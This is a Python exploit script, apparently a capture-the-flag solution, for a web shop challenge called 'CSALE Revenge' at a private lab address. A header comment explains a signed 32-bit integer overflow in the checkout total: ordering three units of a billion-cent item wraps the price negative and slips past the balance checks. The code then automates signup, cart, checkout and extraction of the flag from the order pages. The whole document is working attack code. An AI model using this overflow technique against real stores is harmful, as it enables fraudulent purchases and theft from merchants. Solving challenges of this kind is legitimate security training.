#!/usr/bin/env python3
# CSALE Revenge -- signed 32-bit integer overflow in checkout()
#   total = signed_32(sum(price_cents * quantity))
# Listing 9 ("Flag") costs 1_000_000_000 cents. quantity 3 -> 3_000_000_000,
# which exceeds 2^31, so signed_32 wraps it to -1_294_967_296. Both balance
# guards (`total > balance`, `balance - total < 0`) then pass with a $0 account,
# and the order snapshot copies the listing's fulfillment_note -- the flag.
import requests, secrets, re, sys, html
B = sys.argv[1] if len(sys.argv) > 1 else "http://10.0.173.208:5000"
s = requests.Session(); s.headers["User-Agent"] = "Mozilla/5.0"
u = "t" + secrets.token_hex(4)
print("[*] signup", u)
s.post(f"{B}/signup", data={"username": u, "password": "Passw0rd!123"}, timeout=20)
print("[*] add listing 9 x3 to cart")
s.post(f"{B}/cart/items", data={"listing_id": 9, "quantity": 3}, timeout=20)
r = s.get(f"{B}/cart", timeout=20)
print("[*] cart total shown:", re.findall(r'\$[\d,\.\-]+', re.sub(r'<[^>]+>',' ',r.text))[:6])
print("[*] checkout")
r = s.post(f"{B}/cart/checkout", timeout=30, allow_redirects=False)
print("    ->", r.status_code, r.headers.get("Location"))
r = s.get(f"{B}/account/orders", timeout=20)
ids = sorted(set(int(x) for x in re.findall(r'/orders/(\d+)', r.text)))
print("[*] orders:", ids)
for oid in ids:
    d = s.get(f"{B}/orders/{oid}", timeout=20).text
    txt = html.unescape(re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', d)))
    m = re.search(r'csaw\{[^}]*\}', txt)
    print(f"    order {oid}: {m.group(0) if m else txt[txt.find('Log out')+8:][:300]}")
